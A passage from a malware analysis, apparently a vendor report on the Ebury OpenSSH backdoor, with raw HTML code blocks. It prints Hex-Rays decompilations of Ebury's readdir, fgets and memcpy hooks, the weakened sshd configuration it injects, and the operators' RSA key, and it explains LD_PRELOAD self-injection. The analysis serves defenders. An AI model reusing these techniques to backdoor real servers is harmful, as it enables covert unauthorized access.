class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">strncmp</span><span class="crayon-sy">(</span><span class="crayon-v">dir_entry_1</span><span class="crayon-o">-&gt;</span><span class="crayon-v">d_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ebury_filename</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">ebury_filename_len_before_extension</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803033879321323-25"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">dir_entry_1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803033879321323-26"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><strong>Figure 4</strong>. Hex-Rays output of Ebury’s <span style="font-family: 'courier new', courier, monospace">readdir</span> hook</p>
<p>Activation of these hooks is done by Ebury injecting its dynamic library into every descendant processes of <span style="font-family: 'courier new', courier, monospace">sshd</span>. To inject itself into subprocesses, Ebury hooks <span style="font-family: 'courier new', courier, monospace">execve</span> and use the dynamic linker <span style="font-family: 'courier new', courier, monospace">LD_PRELOAD</span> variable. Every time a new process is created, Ebury adds <span style="font-family: 'courier new', courier, monospace">LD_PRELOAD=&lt;Ebury_filename&gt;</span> to its environment. Once the new process is executed, Ebury’s dynamic library is loaded and its constructor is called, executing the hooking routines.</p>
<p>As mentioned in an <a href="https://srvfail.com/check-clean-ebury-ssh-rootkit/" target="_blank" rel="noopener">article on srvfail.com</a>, there’s a thread on <a href="http://archive.is/XvoWM" target="_blank" rel="noopener">StackExchange</a> of a user stating that his machine was compromised by Ebury. The behavior he describes corresponds to the self-hiding techniques we’ve witnessed in Ebury v1.6.2a.</p>
<p>Earlier versions of Ebury used to work only on very specific versions of OpenSSH and were Linux-distribution-specific. Typically, previous Ebury samples would work for three to five OpenSSH builds for a given Linux distribution. This is no longer the case. Most of the OpenSSH patching routines were replaced by function hooking. There are no hardcoded offsets anymore. We tried installing Ebury on machines running Debian Jessie, CentOS 7 and Ubuntu Artful with the same sample and it worked in all cases.</p>
<p>To inject the OpenSSH server configuration directly into memory, Ebury parses the <span style="font-family: 'courier new', courier, monospace">sshd</span> binary’s code section mapped in the same process looking for two different functions. It tries to find the address of <span style="font-family: 'courier new', courier, monospace">parse_server_config</span> or <span style="font-family: 'courier new', courier, monospace">process_server_config_line</span>. If it fails, it downgrades security features by disabling SELinux Role-Based Access Control and deactivating PAM modules. When one of the functions is successfully resolved, Ebury will use this when the backdoor is used to tamper with <span style="font-family: 'courier new', courier, monospace">sshd</span>&#8216;s configuration.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803034223965930" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
PrintLastLog no
PrintMotd no
PasswordAuthentication no
PermitRootLogin yes
UseLogin no
UsePAM no
UseDNS no
ChallengeResponseAuthentication no
LogLevel QUIET
StrictModes no
PubkeyAuthentication yes
AllowUsers n
AllowGroups n
DenyUsers n
DenyGroups n
AuthorizedKeysFile /proc/self/environ
Banner /dev/null
PermitTunnel yes
AllowTcpForwarding yes
PermitOpen any</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803034223965930-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-2">2</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-4">4</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-6">6</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-8">8</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-10">10</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-12">12</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-14">14</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-16">16</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-18">18</div><div class="crayon-num" data-line="crayon-60581b9803034223965930-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803034223965930-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803034223965930-1">PrintLastLog no</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-2">PrintMotd no</div><div class="crayon-line" id="crayon-60581b9803034223965930-3">PasswordAuthentication no</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-4">PermitRootLogin yes</div><div class="crayon-line" id="crayon-60581b9803034223965930-5">UseLogin no</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-6">UsePAM no</div><div class="crayon-line" id="crayon-60581b9803034223965930-7">UseDNS no</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-8">ChallengeResponseAuthentication no</div><div class="crayon-line" id="crayon-60581b9803034223965930-9">LogLevel QUIET</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-10">StrictModes no</div><div class="crayon-line" id="crayon-60581b9803034223965930-11">PubkeyAuthentication yes</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-12">AllowUsers n</div><div class="crayon-line" id="crayon-60581b9803034223965930-13">AllowGroups n</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-14">DenyUsers n</div><div class="crayon-line" id="crayon-60581b9803034223965930-15">DenyGroups n</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-16">AuthorizedKeysFile /proc/self/environ</div><div class="crayon-line" id="crayon-60581b9803034223965930-17">Banner /dev/null</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-18">PermitTunnel yes</div><div class="crayon-line" id="crayon-60581b9803034223965930-19">AllowTcpForwarding yes</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803034223965930-20">PermitOpen any</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p><strong>Figure 5</strong>. Configuration used by Ebury’s backdoor</p>
<p>Ebury’s authors also hardened their backdoor mechanism. Instead of relying only on a password encoded in the SSH client version string, activating the backdoor now requires a private key to authenticate. It is possible this extra check was added to prevent others who may have found the backdoor password from using it to gain access to the Ebury-compromised server.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803037286515820" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESH
CvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd3BD+ADXDurAlDG
bh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00
H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC/9rqoAdv7Gbc5Y7W8xrNIjOIuxDx
Bx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq6
3E/xqI4tMEQl9BmW1Df5+LjbVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803037286515820-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803037286515820-2">2</div><div class="crayon-num" data-line="crayon-60581b9803037286515820-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803037286515820-4">4</div><div class="crayon-num" data-line="crayon-60581b9803037286515820-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803037286515820-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803037286515820-1">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESH</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803037286515820-2">CvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd3BD+ADXDurAlDG</div><div class="crayon-line" id="crayon-60581b9803037286515820-3">bh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803037286515820-4">H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC/9rqoAdv7Gbc5Y7W8xrNIjOIuxDx</div><div class="crayon-line" id="crayon-60581b9803037286515820-5">Bx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq6</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803037286515820-6">3E/xqI4tMEQl9BmW1Df5+LjbVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p><strong>Figure 6</strong>. Ebury’s operators RSA public key</p>
<p>When there’s a backdoor connection attempt, Ebury modifies the <span style="font-family: 'courier new', courier, monospace">AuthorizedKeysFile</span> option to point to <span style="font-family: 'courier new', courier, monospace">/proc/self/environ</span>. It hooks <span style="font-family: 'courier new', courier, monospace">open</span> or <span style="font-family: 'courier new', courier, monospace">open64</span> and checks whether there’s an attempt to open <span style="font-family: 'courier new', courier, monospace">/proc/self/environ</span> or a path containing <span style="font-family: 'courier new', courier, monospace">.ssh/authorized_keys</span>. The second check might be used as a fallback in case Ebury failed to resolve <span style="font-family: 'courier new', courier, monospace">parse_server_config</span> and <span style="font-family: 'courier new', courier, monospace">process_server_config_line</span> to push its own configuration. Ebury also hooks <span style="font-family: 'courier new', courier, monospace">fgets</span> which is called by <span style="font-family: 'courier new', courier, monospace">sshd</span> to read the content of the authorized_keys file. A global variable is used to make sure <span style="font-family: 'courier new', courier, monospace">fgets</span> is called after the authorized_keys file was opened. Then, the hook fills the <span style="font-family: 'courier new', courier, monospace">fgets</span> buffer with the Ebury operators’ public key so the attackers’ key is used for authentication.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803038530766599" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
char *__fastcall fgets_hook(char *s, __int64 size, FILE *stream)
{
  int fd_env; // ebp
  char *result; // rax

  if ( !(backdoor_command &amp; 1) )
    return fgets_0(s);
  fd_env = fd_proc_self_environ;
  if ( fd_proc_self_environ &lt;= 0 || fd_env != fileno(stream) )
    return fgets_0(s);
  strcpy(
    s,
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESHCvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd"    "3BD+ADXDurAlDGbh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC"    "/9rqoAdv7Gbc5Y7W8xrNIjOIuxDxBx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq63E/xqI4tMEQl9BmW1Df5+Lj"
    "bVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub\n");
  result = s;
  fd_proc_self_environ = 0;
  return result;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803038530766599-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-2">2</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-4">4</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-6">6</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-8">8</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-10">10</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-12">12</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-14">14</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-16">16</div><div class="crayon-num" data-line="crayon-60581b9803038530766599-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803038530766599-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803038530766599-1"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-e">__fastcall </span><span class="crayon-e">fgets_hook</span><span class="crayon-sy">(</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">s</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">__int64 </span><span class="crayon-v">size</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">FILE</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">stream</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">fd_env</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// ebp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">result</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// rax</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">backdoor_command</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">fgets_0</span><span class="crayon-sy">(</span><span class="crayon-v">s</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">fd_env</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">fd_proc_self_environ</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">fd_proc_self_environ</span><span class="crayon-h"> </span><span class="crayon-o">&lt;=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-v">fd_env</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-e">fileno</span><span class="crayon-sy">(</span><span class="crayon-v">stream</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">fgets_0</span><span class="crayon-sy">(</span><span class="crayon-v">s</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">strcpy</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESHCvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd"</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"3BD+ADXDurAlDGbh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00H+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC"</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"/9rqoAdv7Gbc5Y7W8xrNIjOIuxDxBx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq63E/xqI4tMEQl9BmW1Df5+Lj"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"bVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">fd_proc_self_environ</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803038530766599-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">result</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803038530766599-18"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>Figure 7</strong>. Hex-Rays output of the <span style="font-family: 'courier new', courier, monospace">fgets</span> hook</p>
<p>Something that remains a mystery to us is the purpose of this <span style="font-family: 'courier new', courier, monospace">memcpy</span> hook:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980303b734682627" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
char *__fastcall memcpy_hook(char *dst, const char *src, size_t len)
{
  size_t len_1; // r12
  char *result; // rax

  len_1 = len;
  memcpy_orig(dst, src, len);
  if ( len_1 &gt; 0x1F &amp;&amp; !strncmp(src, "chacha20-poly1305@openssh.com,", 0x1EuLL) )
    result = memcpy_orig(dst, src + 30, len_1 - 30);
  else
    result = dst;
  return result;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980303b734682627-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-2">2</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-4">4</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-6">6</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-8">8</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-10">10</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303b734682627-12">12</div><div class="crayon-num" data-line="crayon-60581b980303b734682627-13">13</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980303b734682627-1"><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-e">__fastcall </span><span class="crayon-e">memcpy_hook</span><span class="crayon-sy">(</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">dst</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">const</span><span class="crayon-h"> </span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">src</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">size_t </span><span class="crayon-v">len</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">size_t </span><span class="crayon-v">len_1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// r12</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">result</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// rax</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">len_1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">len</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">memcpy_orig</span><span class="crayon-sy">(</span><span class="crayon-v">dst</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">src</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">len</span><span class="crayon-sy">)</span><span 